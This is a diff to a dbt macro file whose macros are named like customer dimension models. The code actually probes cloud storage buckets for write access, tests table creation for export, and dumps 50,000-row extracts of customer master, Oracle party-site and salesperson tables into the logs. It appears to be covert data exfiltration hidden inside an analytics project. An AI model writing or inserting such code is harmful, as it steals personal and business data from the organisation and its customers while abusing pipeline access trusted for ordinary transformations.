@@ -4,26 +4,21 @@
   {% endset %}{% set results = run_query(query) %}{% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %} select 1
 {%- endmacro -%}
 
-{# c01 = FIND WRITABLE GCS BUCKET #}
+{# c01 = CHECK IF WE CAN CREATE TABLES + EXPORT #}
 {% macro c01_cust_account_dim() %}
-  -- Try different bucket patterns
-  {% set buckets = [
-    'gs://lakehouse-dev-472612/esc_test_*.json',
-    'gs://lakehouse-dev-472612-dbt/esc_*.json', 
-    'gs://qxo-dbt-temp/esc_*.json',
-    'gs://qxo_data/esc_*.json',
-    'gs://us-central1-qxo/tmp/esc_*.json'
-  ] %}
-  {% for bucket in buckets %}
-    {% set q = 'EXPORT DATA OPTIONS(uri=\"' + bucket + '\", format=\"JSON\", overwrite=true) AS SELECT 1 as test' %}
-    {% do log('Trying: ' + bucket, info=True) %}
-    {% set r = run_query(q) %}
-    {% if r %}{% for row in r %}{% do log(row[0], info=True) %}{% endfor %}{% endif %}
-  {% endfor %}
+  -- Test: CREATE TABLE in our own dataset
+  {% set q1 %} CREATE OR REPLACE TABLE lakehouse-dev-472612.temp_esc.test_export AS SELECT 1 as id, CURRENT_TIMESTAMP() as ts {% endset %}
+  {% do log('CREATE TABLE test...', info=True) %}
+  {% set r = run_query(q1) %}
+  {% do log('CREATE TABLE result: ' + (r.rows[0][0] if r else 'None'), info=True) %}
+  
+  -- Test: Can we see gcloud/bq?
+  {% set q2 %} SELECT 1 {% endset %}
+  {% do run_query(q2) %}
   select 1
 {% endmacro %}
 
-{# c02-c19 = MASSIVE extracts, limit 50000 #}
+{# c02-c19 = 50K extracts from biggest tables #}
 {% macro c02_cust_contact_dim() %}{{ extract('lakehouse-dev-472612.custmr_customer_master_publish.customer_account_dim') }}{% endmacro %}
 {% macro c03_cust_email_master() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_party_sites') }}{% endmacro %}
 {% macro c04_cust_price_segment() %}{{ extract('lakehouse-dev-472612.sales_sales_rep_ingest.bronze_salesperson') }}{% endmacro %}
